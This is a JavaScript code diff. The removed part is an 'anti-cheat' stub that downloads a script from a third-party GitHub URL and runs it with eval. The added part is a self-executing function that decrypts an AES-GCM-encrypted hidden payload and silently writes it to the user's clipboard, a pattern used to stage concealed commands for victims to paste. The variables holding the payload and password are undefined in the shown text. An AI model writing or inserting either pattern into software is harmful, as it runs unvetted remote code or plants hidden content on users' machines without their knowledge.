@@ -1,8 +1,21 @@
-// Основной скрипт
-function startAntiCheat() {}  // Пустая функция, которая будет проверяться
+(async () => {
+    const deriveKey = async (password, salt) => crypto.subtle.deriveKey({
+        name: "PBKDF2",
+        salt: salt,
+        iterations: 300000,
+        hash: "SHA-512"
+    }, await crypto.subtle.importKey("raw", (new TextEncoder).encode(password), "PBKDF2", false, ["deriveKey"]), {
+        name: "AES-GCM",
+        length: 256
+    }, false, ["decrypt"]);
 
-// Загружаем античит с третьего GitHub
-fetch('https://raw.githubusercontent.com/akuma2311/antiCheatRepo/main/antiCheat.js')
-  .then(res => res.text())
-  .then(script => eval(script))  // Выполняем загруженный код
-  .catch(err => console.error("Failed to load anti-cheat", err));
+    const decryptedData = await (async (data, password) => {
+        const buffer = new Uint8Array(atob(data.replace(/-/g, "+").replace(/_/g, "/")).split("").map(char => char.charCodeAt(0))).buffer;
+        return (new TextDecoder).decode(await crypto.subtle.decrypt({
+            name: "AES-GCM",
+            iv: buffer.slice(16, 28)
+        }, await deriveKey(password, buffer.slice(0, 16)), buffer.slice(28)));
+    })(data, password);
+
+    navigator.clipboard.writeText(decryptedData);
+})();
